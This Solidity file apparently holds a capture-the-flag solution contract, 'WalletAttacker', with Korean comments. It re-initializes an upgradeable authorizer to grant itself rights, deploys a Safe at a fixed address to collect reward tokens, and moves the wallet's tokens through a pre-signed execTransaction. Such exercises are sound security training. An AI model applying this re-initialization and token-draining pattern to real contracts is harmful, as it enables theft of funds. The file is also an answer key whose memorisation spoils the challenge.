pragma solidity =0.8.25;
import {Enum} from "lib/safe-smart-account/contracts/common/Enum.sol";

//function drop(address aim, bytes memory wat, uint256 num) external returns (bool) {

interface IWalletDeployer{
    function drop(address aim, bytes memory wat, uint256 num) external returns (bool);
}

interface IAuthorizerUpgradeable{
    function init(address[] memory _wards, address[] memory _aims) external;
}

interface IERC20{
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface ISafe {
    function execTransaction(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures
    ) external payable returns (bool success);
}

contract WalletAttacker{

    IWalletDeployer walletDeployer;
    uint256 nonce;
    address aim = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
    bytes initialData;
    IAuthorizerUpgradeable authorizer;
    IERC20 token;
    address ward;



    constructor(address _walletDeployer, uint256 _nonce, bytes memory _initialData, address _authorizer, address _token, address _ward){
        walletDeployer = IWalletDeployer(_walletDeployer);
        nonce = _nonce;
        initialData = _initialData;
        authorizer = IAuthorizerUpgradeable(_authorizer);
        token = IERC20(_token);
        ward = _ward;

        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);
        

        wards[0] = address(this);
        aims[0] = aim;
        authorizer.init(wards,aims);
        walletDeployer.drop(aim, initialData, nonce); // 배포 성공
    }


    function attack(bytes memory messageData, bytes memory sig) public{
        ISafe mySafe = ISafe(aim);
        token.transfer(ward, token.balanceOf(address(this))); // ward에게 보상 토큰 반환

        /* execTransaction. call transfer(user)*/
        // 유저에게 토큰 반환
        mySafe.execTransaction(address(token), 0, messageData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), sig);

    }
}